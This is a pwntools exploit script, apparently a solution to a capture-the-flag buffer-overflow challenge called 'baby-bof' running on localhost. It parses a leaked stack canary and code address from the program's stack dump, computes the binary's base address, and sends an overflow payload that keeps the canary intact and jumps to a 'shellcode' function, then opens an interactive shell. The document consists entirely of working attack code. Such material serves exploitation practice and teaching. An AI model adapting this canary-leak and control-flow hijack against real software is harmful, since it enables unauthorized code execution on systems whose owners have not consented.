#!/usr/bin/env python
from pwn import *

#p = process('./baby-bof')
p = remote('localhost', 30001)
elf = ELF('./baby-bof')

context.log_level = 'debug'

context.arch = 'amd64'

context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

p.recvuntil('Stack Dump:\n')
p.recvuntil('\n') # skip the first line

p.recvuntil(':')
canary = p.recvline()
canary = int(canary, 16)
print('addr: ' + hex(canary))

# leak elf base
"""
gef➤  p 0x005555555552e6-0x00555555554000
$1 = 0x12e6
"""
# drop 11 line
for i in range(11):
    p.recvuntil('\n')

# read elf base
p.recvuntil(':')
elf_base = p.recvline()
elf_base = int(elf_base, 16)
elf_base = elf_base - 0x12e6
print('elf_base: ' + hex(elf_base))


p.recvuntil('End')

payload = b'A' * 8 + p64(canary) + b'A' * 8
payload += p64(elf_base + elf.symbols['shellcode'])

p.sendlineafter(':', payload)

p.interactive()
